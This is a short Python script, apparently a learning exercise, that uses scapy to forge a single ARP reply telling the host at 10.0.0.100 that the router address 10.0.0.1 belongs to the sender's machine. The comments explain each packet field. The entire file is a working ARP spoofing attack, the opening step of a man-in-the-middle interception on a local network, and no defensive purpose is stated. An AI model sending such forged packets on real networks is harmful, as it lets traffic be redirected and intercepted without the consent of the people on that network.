import scapy.all as scapy
#  op1 is for request, op2 is for response
# pdst is the target ip address
# hwdst is the target mac address
# psrc is the source ip address which I set to router ip address
packet = scapy.ARP(op=2, pdst="10.0.0.100", hwdst="68:1d:ef:39:7a:9e", psrc="10.0.0.1")
# print(packet.show())
# print(packet.summary())
scapy.send(packet)
